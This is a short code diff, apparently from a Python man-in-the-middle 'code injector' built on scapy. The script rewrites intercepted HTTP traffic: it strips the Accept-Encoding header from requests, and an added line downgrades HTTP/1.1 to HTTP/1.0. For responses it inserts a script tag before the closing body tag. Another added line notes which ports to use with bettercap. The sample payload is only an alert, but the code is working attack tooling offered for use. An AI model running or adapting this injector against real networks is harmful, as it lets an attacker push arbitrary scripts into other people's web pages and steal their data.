@@ -17,8 +17,10 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         load = scapy_packet[scapy.Raw].load
+        # if your using bettercap replace the ports with given port number
         if scapy_packet[scapy.TCP].dport == 80:
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            load = load.replace("HTTP/1.1", "HTTP/1.0")
         elif scapy_packet[scapy.TCP].sport == 80:
             injection_code = "<script>alert('test');</script>"
             load = load.replace("</body>", injection_code + "</body>")
